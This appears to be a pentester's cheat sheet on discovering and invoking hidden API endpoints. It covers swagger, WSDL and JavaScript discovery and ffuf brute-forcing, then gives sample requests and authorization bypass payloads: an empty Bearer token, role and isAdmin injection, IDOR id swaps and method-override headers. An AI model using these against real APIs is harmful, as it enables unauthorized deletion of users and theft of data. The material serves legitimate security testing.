## API - Invoking Hidden Methods

Where hidden methods come from
+ Old/deprecated endpoints (still active)
+ Admin/debug functions
+ Mobile app APIs (not exposed in web UI)
+ Internal APIs accidentally exposed
+ SOAP operations not referenced in frontend

1. Discovery Phase

A. From documentation leaks
```
/swagger.json
/swagger-ui
/api-docs
/openapi.json
```
```
curl -s http://target.com/swagger.json | jq
```

Look for:
+ Unused endpoints
+ Admin paths
+ Debug routes

B. From WSDL (SOAP)
```
<operation name="DeleteUser">
<operation name="ResetPassword">
```

C. JavaScript analysis
```
grep -r "api/" .
grep -r "fetch(" .
grep -r "axios" .
```

Look for:
+ Hidden routes
+ Hardcoded endpoints
+ Different API versions

D. Traffic analysis (Burp)
+ Background requests
+ Failed/unused calls
+ Preloaded endpoints

E. Wordlist brute-force
```
ffuf -u http://target.com/api/FUZZ -w api_wordlist.txt
```

2. Invocation Phase

Basic request crafting
```
curl -X POST http://target.com/api/admin/deleteUser \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id":1}'
```
```
GET /endpoint
POST /endpoint
PUT /endpoint
DELETE /endpoint
```
```
{"id":1}
{"user_id":1}
{"uid":1}
{"username":"admin"}
```
```
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
```

3. Bypass Techniques

A. Missing authentication
+ No token
+ Empty token
+ Fake token

```
Authorization: Bearer
```

B. Role confusion
```
{"role":"admin"}
```

C. IDOR on hidden methods
```
{"id":2} → {"id":999}
```

D. Version bypass
```
/api/v1/admin → /api/v2/admin
/api/internal → /api/external
```

E. Method override
```
X-HTTP-Method-Override: DELETE
```

4. Indicators you found something real

+ Different response than normal endpoints
+ Verbose error messages
+ “Unauthorized” instead of “Not Found”
+ Slower response (backend processing)
+ Data leakage

5. High-Value Targets
```
/admin/*
/internal/*
/debug/*
/test/*
/export/*
/backup/*
```

6. Common Vulnerabilities

Mass Assignment
```
{"isAdmin":true}
```

Dangerous actions exposed
+ Delete user
+ Reset password
+ Dump database
+ Export data

### Fast Workflow

1. Check docs (swagger, wsdl)

2. Inspect JS files

3. Capture traffic (Burp)

4. Bruteforce /api/

5. Replay requests manually

6. Modify:
+ method
+ params
+ auth

7. Look for:
+ admin/debug/internal